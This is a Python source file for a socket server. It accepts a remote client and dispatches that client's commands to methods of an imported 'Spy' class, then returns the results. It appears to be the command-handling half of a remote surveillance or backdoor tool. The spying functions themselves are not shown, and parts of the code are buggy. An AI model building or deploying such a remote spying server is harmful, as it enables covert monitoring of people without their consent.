from typing import Optional, Tuple
import socket
from consts import *
from . import *
from spying import Spy
from inspect import signature


class Server:
    def __init__(self):
        self.spy = Spy()
        self.socket = socket.socket()
        self.client: Optional[socket.socket] = None
        self.client_address: Optional[Tuple[str, int]] = None
        self.client_live = False

    def wait_for_client(self):
        while True:
            self.socket.bind(("0.0.0.0", PORT))
            self.socket.listen()
            self.client, self.client_address = self.socket.accept()
            self.client_live = True
            self.wait_for_command()

    def wait_for_command(self):
        while True:
            try:
                data = receive_msg(self.client)
            except ConnectionError:
                self.client_live = False
                return
            data = data.split(str(Massages.SEP))
            command, params = data[0], data[1::]
            result = self.execute_command(command, params)
            send(result, self.client)

    def execute_command(self, command: str, params: list) -> str:
        match command:
            case str(Massages.EXIT):
                return str(Massages.BYE)
        if command in SPY_COMMANDS:
            command = SPY_COMMANDS[command]
            function = getattr(self.spy, command, None)
            if not function:
                return str(Massages.INVALID_COMMAND)
            if not is_valid_num_of_params(function, len(params)):
                return str(Massages.INVALID_NUMBER_OF_PARAMS)
            if not cast_params(function, params):
                return str(Massages.INVALID_PARAMS)
            result = function(*params)
            if isinstance(result, str):
                return result
            if isinstance(result, bool):
                return str(Massages.OK if result else Massages.NOT_OK)
            else:
                return str(result)
        elif command in OTHER_COMMANDS:
            pass
        else:
            return str(Massages.INVALID_COMMAND)


def is_valid_num_of_params(func: callable, num: int) -> bool:
        sig = signature(func)
        maxi = len(sig.parameters)
        mini = 0
        for name, param in sig.parameters.items():
            if name == "self":
                maxi -= 1
            if param.default == param.empty:
                mini += 1
        return mini <= num <= maxi


def cast_params(func: callable, params: list) -> bool:
    """
    casting the list of string params to the right type.
    return whether succeeded or not.
    """
    sig = signature(func)
    i = 0
    for name, param in sig.parameters.items():
        if name == "self":
            continue
        if params[i] == Massages.DEFAULT_PARAM:
            if param.default == param.empty:
                return False
            params[i] = param.default
            i += 1
            continue
        if param.annotation == param.empty:
            i += 1
            continue
        try:
            params[i] = param.annotation(params[i])
        except Exception:
            return False
    return True




